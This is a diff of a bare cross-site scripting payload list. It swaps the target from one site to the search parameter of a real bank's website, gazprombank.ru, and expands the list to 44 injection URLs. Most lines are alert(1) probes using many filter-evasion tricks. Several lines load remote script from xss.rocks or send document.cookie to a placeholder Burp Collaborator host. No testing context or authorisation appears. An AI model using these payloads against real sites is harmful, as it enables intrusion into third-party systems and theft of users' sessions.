@@ -1,24 +1,44 @@
-https://curelinktech.com/q=<script>alert(1)</script>
-https://curelinktech.com/q="><svg/onload=alert(1)>
-https://curelinktech.com/q='><img src=x onerror=alert(1)>
-https://curelinktech.com/q=<iframe src="javascript:alert(1)"></iframe>
-https://curelinktech.com/q=<svg><script>alert(1)</script>
-https://curelinktech.com/q=<details open ontoggle=alert(1)>
-https://curelinktech.com/q=<math><mtext></mtext><script>alert(1)</script>
-https://curelinktech.com/q=<video><source onerror="alert(1)">
-https://curelinktech.com/q=<marquee onstart=alert(1)>
-https://curelinktech.com/q=<isindex type=image src=1 onerror=alert(1)>
-https://curelinktech.com/q=<svg onload=confirm(1)>
-https://curelinktech.com/q=<svg><a xlink:href="javascript:alert(1)">X</a></svg>
-https://curelinktech.com/q=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
-https://curelinktech.com/q=<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>
-https://curelinktech.com/q=<svg><style>@keyframes x{}</style><x onanimationstart=alert(1) style="animation-name:x"></x></svg>
-https://curelinktech.com/q="><script src=//xss.rocks/xss.js></script>
-https://curelinktech.com/q="><script>fetch('https://your-burpcollab.com?c='+document.cookie)</script>
-https://curelinktech.com/q="><img src=x onerror=fetch('https://your-burpcollab.com?c='+document.cookie)>
-https://curelinktech.com/q="><input onfocus=alert(1) autofocus>
-https://curelinktech.com/q="><body onload=alert(1)>
-https://curelinktech.com/q="><object data="javascript:alert(1)">
-https://curelinktech.com/q="><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-https://curelinktech.com/q="><a href="javascript:alert(1)">click</a>
-https://curelinktech.com/q="><form><button formaction="javascript:alert(1)">X</button></form>
+https://gazprombank.ru/?search=<script>alert(1)</script>
+https://gazprombank.ru/?search=\"><svg/onload=alert(1)>
+https://gazprombank.ru/?search='><img src=x onerror=alert(1)>
+https://gazprombank.ru/?search=<iframe src=\"javascript:alert(1)\"></iframe>
+https://gazprombank.ru/?search=<svg><script>alert(1)</script>
+https://gazprombank.ru/?search=<details open ontoggle=alert(1)>
+https://gazprombank.ru/?search=<math><mtext></mtext><script>alert(1)</script>
+https://gazprombank.ru/?search=<video><source onerror=\"alert(1)\">
+https://gazprombank.ru/?search=<marquee onstart=alert(1)>
+https://gazprombank.ru/?search=<isindex type=image src=1 onerror=alert(1)>
+https://gazprombank.ru/?search=<svg onload=confirm(1)>
+https://gazprombank.ru/?search=<svg><a xlink:href=\"javascript:alert(1)\">X</a></svg>
+https://gazprombank.ru/?search=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+https://gazprombank.ru/?search=<svg><foreignObject><iframe srcdoc=\"<script>alert(1)</script>\"></iframe></foreignObject></svg>
+https://gazprombank.ru/?search=<svg><style>@keyframes x{}</style><x onanimationstart=alert(1) style=\"animation-name:x\"></x></svg>
+https://gazprombank.ru/?search=\"><script src=//xss.rocks/xss.js></script>
+https://gazprombank.ru/?search=\"><script>fetch('https://your-burpcollab.com?c='+document.cookie)</script>
+https://gazprombank.ru/?search=\"><img src=x onerror=fetch('https://your-burpcollab.com?c='+document.cookie)>
+https://gazprombank.ru/?search=\"><input onfocus=alert(1) autofocus>
+https://gazprombank.ru/?search=\"><body onload=alert(1)>
+https://gazprombank.ru/?search=\"><object data=\"javascript:alert(1)\">
+https://gazprombank.ru/?search=\"><embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">
+https://gazprombank.ru/?search=\"><a href=\"javascript:alert(1)\">click</a>
+https://gazprombank.ru/?search=\"><form><button formaction=\"javascript:alert(1)\">X</button></form>
+https://gazprombank.ru/?search=<img src=x onerror=alert`1`>
+https://gazprombank.ru/?search=<svg><g onload=alert(1)>
+https://gazprombank.ru/?search=<base href=\"javascript:alert(1)//\">
+https://gazprombank.ru/?search=<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">
+https://gazprombank.ru/?search=<object type=\"text/x-scriptlet\" data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">
+https://gazprombank.ru/?search=<link rel=\"stylesheet\" href=\"javascript:alert(1)\">
+https://gazprombank.ru/?search=<form><textarea autofocus onfocus=alert(1)></textarea></form>
+https://gazprombank.ru/?search=<button onclick=alert(1)>Click</button>
+https://gazprombank.ru/?search=<input type=\"image\" src=\"x\" onerror=\"alert(1)\">
+https://gazprombank.ru/?search=<div style=\"background:url(javascript:alert(1))\">
+https://gazprombank.ru/?search=<style>*{background-image:url(\"javascript:alert(1)\")}</style>
+https://gazprombank.ru/?search=<script>document.write('<img src=x onerror=alert(1)>')</script>
+https://gazprombank.ru/?search=<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>
+https://gazprombank.ru/?search=<img src=x:alert(1) onerror=eval(src)>
+https://gazprombank.ru/?search=<svg><script xlink:href=\"data:text/javascript,alert(1)\"></script></svg>
+https://gazprombank.ru/?search=<svg><use xlink:href=\"javascript:alert(1)\"></use></svg>
+https://gazprombank.ru/?search=<div onpointerdown=alert(1)>click</div>
+https://gazprombank.ru/?search=<video autoplay><source src=\"x\" onerror=\"alert(1)\">
+https://gazprombank.ru/?search=<audio src onerror=\"alert(1)\">
+https://gazprombank.ru/?search=<img src=x onerror=\"this.onerror=null;alert(1)\">
